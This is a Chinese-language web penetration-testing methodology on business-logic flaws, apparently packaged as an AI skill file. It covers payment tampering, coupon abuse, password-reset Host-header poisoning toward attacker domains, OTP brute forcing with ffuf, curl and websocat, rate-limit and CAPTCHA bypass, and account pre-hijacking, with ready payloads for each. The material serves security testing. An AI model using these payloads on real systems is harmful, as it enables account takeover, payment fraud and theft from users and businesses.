# business-logic-attack

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# 业务逻辑漏洞方法论

业务逻辑漏洞的本质是：应用在服务端没有正确校验业务规则，导致攻击者可以通过修改请求参数来违反预期的业务流程。这类漏洞 WAF 和自动化扫描器几乎无法检测——因为每个请求看起来都是"正常"的 HTTP 请求。

## Phase 0: 攻击面识别

先通读应用功能，找到所有涉及"状态变化"或"价值转移"的操作：

| 功能类型 | 关注点 | 典型漏洞 |
|----------|--------|----------|
| 支付/购买 | price/amount/total 参数 | 金额篡改、0元购、负数退款 |
| 优惠券/促销 | coupon/promo/discount | 复用、枚举、叠加 |
| 积分/余额 | points/balance/credits | 负数充值、并发消费 |
| 订单流程 | order_id/status/step | 状态跳转、重复操作 |
| 短信/邮箱验证 | phone/email/code | 轰炸、爆破、绕过 |
| 密码重置 | token/code/user_id | 任意用户重置 |
| 用户注册 | role/type/is_admin | 角色注入（→ privilege-escalation-web） |
| 文件/资源操作 | file_id/doc_id | 越权访问（→ idor-methodology） |

## Phase 1: 支付与交易

### 1.1 金额篡改

拦截支付请求，修改 price/amount/total 参数：

```
原始: POST /api/pay {"order_id":"123","amount":9999}
测试: POST /api/pay {"order_id":"123","amount":1}
测试: POST /api/pay {"order_id":"123","amount":0}
测试: POST /api/pay {"order_id":"123","amount":-1}
测试: POST /api/pay {"order_id":"123","amount":0.01}
```

重点检查：
- 服务端是否用客户端传来的金额，还是从数据库查询商品价格
- 负数金额是否会导致退款到账户余额
- 小数精度问题（0.001 元能否通过校验）

### 1.2 数量篡改

```
原始: {"product_id":"A","quantity":1,"price":100}
测试: {"product_id":"A","quantity":0,"price":100}    → 0元购？
测试: {"product_id":"A","quantity":-1,"price":100}   → 退款？
测试: {"product_id":"A","quantity":99999,"price":100} → 溢出？
```

### 1.3 订单状态篡改

```
正常流程: 待支付(0) → 已支付(1) → 已发货(2) → 已完成(3)
攻击: 直接发 status=1 跳过支付
攻击: 已完成后再发 status=0 重新获取商品
攻击: 修改其他用户的订单状态
```

### 1.4 支付回调伪造

第三方支付（支付宝/微信/Stripe）回调通常是 POST 到应用的 notify_url：
- 检查回调是否验证签名
- 是否可以修改 `total_amount` 字段
- 是否可以重放回调请求（重复到账）
- 是否可以用测试环境的支付结果通知正式环境

## Phase 2: 优惠券与积分

### 2.1 优惠券滥用

```
# 同一优惠码多次使用
POST /api/coupon/apply {"code":"SAVE50"} → 重复发送

# 优惠码枚举（如果格式可预测）
PROMO001, PROMO002, PROMO003...

# 多优惠券叠加
POST /api/coupon/apply {"codes":["SAVE50","WELCOME20"]}

# 负折扣
POST /api/coupon/apply {"discount":-100}
```

### 2.2 积分/余额操作

```
# 转账负数
POST /api/transfer {"to":"victim","amount":-100}

# 并发充值竞争 → 与 race-condition-exploit 配合
# 积分兑换精度问题（取整方向是否可利用）
```

## Phase 3: 验证码与认证

### 3.1 短信验证码

```
# 短信轰炸：同一号码无频率限制
# 验证码爆破：4-6 位数字穷举
# 验证码复用：验证成功后 code 未失效
# 验证码泄露：响应中返回了 code
# 手机号参数污染：
POST /api/sms/send {"phone":["13800138000","attacker_phone"]}
```

### 3.2 密码重置漏洞

```
# 任意用户密码重置 — 修改 user_id/email
POST /api/reset {"token":"valid_token","user_id":"victim_id","password":"hacked"}

# Host 头注入 — 重置链接指向攻击者域名
POST /api/forgot  Host: evil.com  {"email":"victim@target.com"}
```

### 3.3 登录逻辑

```
# 账户锁定绕过 — 大小写/空格/unicode 变体
# 响应差异枚举 — "用户名不存在" vs "密码错误"
```

## Phase 4: 流程跳过

### 4.1 多步骤操作跳过

```
正常: Step1(填信息) → Step2(验证) → Step3(提交)
攻击: 直接请求 Step3 的 API，跳过验证步骤
```

### 4.2 前端校验绕过

所有前端校验都可通过抓包绕过——价格只读字段、按钮 disabled、下拉限制选项。

## 通用测试清单

```
✅ 所有价格/金额参数: 改为 0、负数、极大值、小数
✅ 所有数量参数: 改为 0、负数、极大值
✅ 所有状态参数: 尝试跳转、回退、重复
✅ 所有 ID 参数: 替换为其他用户/订单的 ID (→ IDOR skill)
✅ 所有验证码: 复用、爆破、轰炸
✅ 所有优惠券: 复用、枚举、叠加
✅ 所有多步骤操作: 跳过中间步骤
✅ 并发请求: 余额消费、优惠券使用 (→ race-condition skill)
```

## 深入参考

- 业务逻辑缺陷模式速查（支付/2FA/CAPTCHA/速率限制/注册/密码重置） → [references/logic-flaw-patterns.md](references/logic-flaw-patterns.md)


---

## REF: logic-flaw-patterns

# 业务逻辑缺陷模式速查

## 1. 支付/交易逻辑缺陷

### 1.1 关键参数篡改

| 参数类型 | 篡改方向 | 预期效果 |
|----------|----------|----------|
| `success` / `status` | `false` -> `true` | 跳过实际支付 |
| `callback` / `return_url` | 替换为攻击者 URL | 劫持支付回调 |
| `total_amount` / `price` | 改小/改零/改负 | 低价购买或反向充值 |

### 1.2 支付 URL 与回调

- 响应中 `example.com/payment/MD5HASH` 格式 URL：提取后新窗口打开，测试能否跳过扣款
- 修改 MD5HASH 部分以复用/伪造支付凭证

### 1.3 Cookie、响应与会话篡改

```http
# Cookie 篡改
Cookie: payment_status=completed; order_total=0

# 响应篡改 — 拦截后修改
{"status":"failed"} -> {"status":"success"}

# 会话令牌 — 重放成功支付回调以重复到账
```

---

## 2. 2FA/MFA 绕过

### 2.1 流程跳过

```http
# 直接访问受保护端点，伪造 Referer
GET /dashboard HTTP/1.1
Referer: https://target.com/2fa-verify
```

### 2.2 令牌滥用

| 手法 | 描述 |
|------|------|
| 令牌复用 | 已使用的 OTP 重新提交 |
| 跨账户 | 用自己账户的 OTP 验证其他账户 |
| 响应泄露 | API 响应中直接返回了 OTP |
| 邮箱验证链接 | 注册确认链接可能绕过 2FA |

### 2.3 会话操纵

同时开启攻击者和受害者的会话，完成攻击者的 2FA 验证后，尝试用已验证状态访问受害者流程。

### 2.4 密码重置绕过 2FA

注册 -> 启用 2FA -> 触发密码重置 -> 用新密码登录，观察是否跳过 2FA。

### 2.5 OTP 暴力破解

```bash
ffuf -w <(seq -w 000000 999999) -u https://target/api/verify-2fa \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"FUZZ"}' -mc 200
```

- 即使触发 429/401，有效 OTP 可能仍返回 200——不要过早停止
- 重发验证码可重置速率限制计数器
- 慢速暴力可绕过流速限制

### 2.6 其他手法

- "记住设备" Cookie 预测：`remember_2fa=base64(user_id+timestamp)`
- IP 伪装：`X-Forwarded-For: <victim_ip>`
- 旧版子域名/API（`/v1/login`）可能未实施 2FA
- CSRF/Clickjacking 禁用 2FA 设置
- 备份码若存在 CORS 错误或 XSS 可被窃取

---

## 3. CAPTCHA 绕过

### 3.1 参数操纵

| 手法 | 操作 |
|------|------|
| 删除参数 | 移除 `captcha` 字段 |
| 空值提交 | `captcha=` 或 `captcha=null` |
| 更换方法 | POST -> GET，form-data -> JSON |
| 旧值复用 | 重复使用已成功的值 |
| 跨会话复用 | 同一值在不同 session 提交 |

### 3.2 值提取

```javascript
// 页面源码中的隐藏字段
document.querySelector('[name=captcha_hash]').value
// Cookie 中存储的答案
document.cookie  // captcha_answer=XXXX
```

### 3.3 自动识别

```bash
# Tesseract OCR
tesseract captcha.png stdout --psm 7 -c tessedit_char_whitelist=0123456789ABCDEFabcdef
```

- 数学运算型：正则提取表达式后计算
- 有限图片集：MD5 哈希建立映射表
- 音频验证码：语音转文字服务

---

## 4. 速率限制绕过

### 4.1 端点变体

```
/api/v3/login  ->  /api/v1/login | /Api/Login | /api/v3/login/ | /api/v3/login?dummy=1
```

### 4.2 空白字符注入

```
code=1234%00    code=1234%0a    code=1234%0d    code=1234%09    code=1234%20
email=victim@test.com%00    email=victim@test.com%0d%0a
```

### 4.3 IP 来源伪造

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
```

### 4.4 HTTP/2 多路复用

```bash
seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge -X POST \
  -H "Content-Type: application/json" \
  -d '{"code":"@"}' https://target/api/v2/verify &>/dev/null
```

限制器按 TCP 连接计数，而非 HTTP/2 stream 数量。

### 4.5 GraphQL 别名批量

```graphql
mutation bruteForceOTP {
  a: verify(code:"111111") { token }
  b: verify(code:"222222") { token }
  c: verify(code:"333333") { token }
}
```

单请求多 alias，限制器只计一次。

### 4.6 其他协议绕过

| 手法 | 原理 |
|------|------|
| REST 批量端点 | `/v2/batch` 接受请求数组，限制器仅计一次 |
| 滑动窗口定时 | 观察 `X-RateLimit-Reset`，在窗口边界两侧各发满额请求 |
| WebSocket 升级 | 升级后帧不作为独立 HTTP 请求计数 |
| gRPC 流式 | 单连接内发送多个请求 |
| CDN PoP 分片 | 各数据中心独立计数，通过代理池路由到不同 PoP |

```bash
# WebSocket 洪泛
seq -w 000000 000999 | websocat -n ws://target/api/verify-ws
```

---

## 5. 注册流程漏洞

### 5.1 重复注册绕过

| 手法 | Payload |
|------|---------|
| 大写变体 | `Victim@email.com` |
| 子地址 | `victim+1@gmail.com` |
| 点号 | `v.ictim@gmail.com` |
| 空白字符 | `victim@email.com%00` / `%20` |
| 尾部空格 | `victim@email.com ` |
| 双 @ | `victim@gmail.com@attacker.com` |
| Unicode | 同形字符或软连字符 `\u00AD` |

### 5.2 用户名枚举

- 错误消息/状态码差异
- 响应时间差异（已注册触发 DB 查询）
- 团队邀请流程泄露账户存在性

### 5.3 注册即重置（Upsert 覆盖）

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"email":"victim@example.com","password":"attacker_pwd"}
```

注册端点对已有邮箱执行 upsert 而非拒绝，无需令牌即可接管账户。

### 5.4 账户预劫持（Pre-Hijacking）

| 手法 | 攻击流程 |
|------|----------|
| 经典-联合合并 | 用受害者邮箱注册 -> 受害者 SSO 登录 -> 合并逻辑保留攻击者访问 |
| 未过期会话 | 创建账户保持会话 -> 受害者重置密码 -> 旧会话仍有效 |
| 木马标识符 | 添加二级邮箱/手机/IdP -> 受害者使用后 -> 攻击者通过木马标识符恢复 |
| 待确认变更 | 发起邮箱变更不确认 -> 受害者恢复 -> 攻击者完成变更接管 |
| 未验证 IdP | 通过不验证邮箱的 IdP 断言受害者邮箱 -> 服务未检查 `email_verified` |

### 5.5 OTP 多值走私

```bash
code=000000&code=123456
{"code":["000000","123456"]}
code=000000,123456
```

后端可能接受数组/多值并匹配其中任一。

---

## 6. 密码重置漏洞

### 6.1 Referrer 泄露令牌

点击重置链接后不修改密码，直接访问第三方链接 -> 检查 `Referer` 头中是否包含 token。

### 6.2 Host 头投毒

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

{"email":"victim@target.com"}
```

受害者收到的链接变为 `https://attacker.com/reset?token=TOKEN`。

### 6.3 邮箱参数污染

```http
email=victim@mail.com&email=attacker@mail.com
{"email":["victim@mail.com","attacker@mail.com"]}
email=victim@mail.com%0A%0Dcc:attacker@mail.com
email=victim@mail.com%0A%0Dbcc:attacker@mail.com
email=victim@mail.com,attacker@mail.com
email=victim@mail.com|attacker@mail.com
```

### 6.4 弱令牌分析

| 生成因素 | 风险 |
|----------|------|
| 时间戳 | 可预测窗口 |
| 用户 ID / 邮箱 | 已知信息参与生成 |
| UUID v1 | 含时间+MAC，可推算 |
| 纯数字 / 短序列 | 可暴力枚举 |
| 无过期 | 扩大攻击窗口 |

工具：Burp Sequencer 分析随机性，guidtool 分析 UUID。

### 6.5 用户名碰撞

注册 `"admin "` (尾部空格) -> 触发密码重置 -> 令牌发至攻击者邮箱 -> 重置 `admin` 密码。

### 6.6 IDOR 篡改

```http
POST /api/changepass HTTP/1.1
Content-Type: application/json

{"email":"victim@email.com","password":"new_password"}
```

### 6.7 会话轮换暴力

OTP 尝试次数按会话追踪时：每 N 次请求新会话 -> 重发重置获取新 OTP -> 随机猜测（OTP 随会话变化）。

### 6.8 后置检查

- 已过期令牌能否仍使用
- 重置成功后旧会话是否失效
- 待处理的邮箱/手机变更是否被清除
